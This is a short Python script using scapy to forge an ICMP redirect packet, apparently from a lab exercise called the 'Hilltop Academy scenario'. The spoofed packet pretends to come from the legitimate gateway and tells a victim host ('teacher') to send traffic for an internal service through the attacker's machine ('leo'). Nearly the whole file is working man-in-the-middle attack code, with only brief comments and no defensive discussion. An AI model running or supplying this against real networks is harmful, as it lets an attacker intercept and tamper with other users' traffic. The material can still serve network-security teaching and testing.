from scapy.all import ICMP, IP, send

# Configuration of IP addresses based on the Hilltop Academy scenario

gateway_ip = "192.168.50.1"  # legit gateway
attacker_ip = "192.168.50.30"  # leo
victim_ip = "192.168.50.40"  # teacher
target_ip = "192.168.70.10"  # internal service

# Constructing the ICMP redirect packet
# Type 5 is Redirect, code 1 is for host redirect
icmp = ICMP(type=5, code=1)

# The new gateway the victim should use
icmp.gw = attacker_ip

# The IP layer for the ICMP redirect
ip = IP(src=gateway_ip, dst=victim_ip)

# The IP layer of the original packet that triggered the redirect
# Typically, this would be a packet sent from the victim to an outside IP
original_packet_ip = IP(src=victim_ip, dst=target_ip)

# Constructing the full packet (ICMP redirect + original IP header)
packet = ip / icmp / original_packet_ip
# Sending the packet
send(packet)  # layer 3

# DONE!
